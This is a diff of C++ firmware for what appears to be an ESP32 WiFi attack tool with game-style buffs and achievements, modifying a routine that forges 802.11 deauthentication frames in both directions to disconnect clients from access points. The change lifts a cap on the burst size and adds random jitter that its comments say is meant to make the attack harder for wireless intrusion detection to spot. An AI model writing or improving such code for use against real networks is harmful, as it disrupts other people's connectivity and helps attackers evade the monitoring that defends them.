@@ -2448,25 +2448,26 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
     // Guard: skip TX if WiFi driver not ready (prevents TG1WDT after resume)
     if (!NetworkRecon::canSendFramesNow()) return;
 
-    // Match Spectrum/CYD pattern: send 1 forward + 1 reverse per iteration,
-    // with a delay between iterations to let the WiFi driver drain the TX queue.
-    // The previous 5-iteration burst with 10 rapid-fire frames exhausted the
-    // driver's internal TX buffer pool (ESP_ERR_NO_MEM=257) even with 32 buffers.
+    // Send burst of deauth frames for more effective disconnection
+    // Random jitter between frames makes it harder for WIDS to detect pattern
+    // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t jitterMax = SwineStats::getDeauthJitterMax();
 
     // Mark session as having deauthed (for Silent Witness achievement tracking)
     SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
     sess.everDeauthed = true;
 
-    // Cap count to prevent queue flood — 2 iterations = 4 frames max
-    if (count > 2) count = 2;
-
     for (uint8_t i = 0; i < count; i++) {
         // AP -> Client (pretend to be AP)
-        sendDeauthFrame(bssid, station, 7);
+        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
+
+        // Random jitter 1-Nms between forward and reverse frames (buff-modified)
+        delay(random(1, jitterMax + 1));
 
         // Client -> AP (pretend to be client) - bidirectional attack
         if (memcmp(station, broadcast, 6) != 0) {
+            // Only if not broadcast - swap source/dest
             uint8_t reversePacket[26] = {
                 0xC0, 0x00,  // Frame Control: Deauth
                 0x00, 0x00,  // Duration
@@ -2481,17 +2482,22 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
             esp_err_t rev_err = esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
             if (rev_err != ESP_OK) {
                 deauthTxErrors++;
-                if (rev_err == 257) {
-                    yield();
-                    return;  // Queue full — stop immediately
-                }
+            }
+
+            // Jitter between iterations (buff-modified)
+            // CRITICAL FIX: Use yield() on longer jitters to prevent WDT reset
+            uint32_t jitterMs = random(1, jitterMax + 1);
+            if (jitterMs > 3) {
+                delay(2);
+                yield();  // Feed watchdog on longer delays
+                delay(jitterMs - 2);
+            } else {
+                delay(jitterMs);
             }
         }
 
-        // Small delay between iterations to let WiFi driver drain TX queue
-        // This prevents ESP_ERR_NO_MEM (257) from rapid-fire TX flooding
-        if (i < count - 1) {
-            delay(1);
+        // Yield every 4 frames to feed watchdog during large bursts
+        if ((i & 0x03) == 0x03) {
             yield();
         }
     }
